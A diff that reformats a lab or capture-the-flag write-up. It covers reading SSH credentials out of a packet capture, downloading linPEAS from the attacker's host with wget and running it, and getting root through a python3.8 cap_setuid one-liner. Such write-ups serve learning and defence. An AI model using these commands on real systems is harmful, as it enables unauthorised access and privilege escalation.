@@ -32,14 +32,14 @@ I figured that the file was related to Wireshark, a tool to analyze and capture 
 PCAP stands for **Packet Capture**.<br><br>
 
 To get a better understanding of Wireshark, I watched a tutorial from this video:<br>
-https://youtu.be/qTaOZrDnMzQ?si=TxdIpK_-dVGmajMT<br><br>
+```https://youtu.be/qTaOZrDnMzQ?si=TxdIpK_-dVGmajMT```<br><br>
 
 After that, I started examining the packets closely. I opened the file in Wireshark and used:<br>
-Right-click -> follow -> TCP Stream<br>
+```Right-click -> follow -> TCP Stream```<br>
 Here, I got Nathan’s Password.<br><br>
 
 Since ssh is also open, I tried entering through ssh using:<br>
-ssh nathan@10.10.10.245<br>
+```ssh nathan@10.10.10.245```<br>
 And… BOOM! I’m IN!!<br><br>
 
 Inside Nathan’s home directory, I found user.txt file, which contained the user flag:<br>
@@ -50,27 +50,29 @@ After exploring the remaining directories and files, nothing else of value turne
 
 To escalate privileges, I decided to run linPEAS, a powerful enumeration script that helps identify privilege escalation paths on Linux systems.<br>
 I set up a listener on my machine:<br>
-	python3 -m http.server 80<br><br>
+	```python3 -m http.server 80```<br><br>
   
 And download linPeas on the target machine (as Nathan):<br>
-wget http://10.10.14.97/linpeas.sh<br><br>
+```wget http://10.10.14.97/linpeas.sh```<br><br>
 
 made it executable by:<br>
-	chmod +x linpeas.sh<br><br>
+	```
+	chmod +x linpeas.sh
+	```<br><br>
   
 and execute it:<br>
- 	./linpeas.sh<br><br>
+ 	```./linpeas.sh```<br><br>
   
 It gave me a plenty of information. One of them was file capabilities:<br>
-	/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip<br><br>
+	```/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip```<br><br>
 
 Might be useful.<br><br>
 
 Searched up gtfobins python and got this in file capabilities:<br>
-	./python -c 'import os; os.setuid(0); os.system("/bin/sh")'<br><br>
+	```./python -c 'import os; os.setuid(0); os.system("/bin/sh")'```<br><br>
   
 So, adjusting it for the target machine’s Python binary, the final payload becomes:<br>
-	/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'<br><br>
+	```/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'```<br><br>
   
 I executed it in the victim’s machine. BOOM!! I am the root user.<br><br>
 
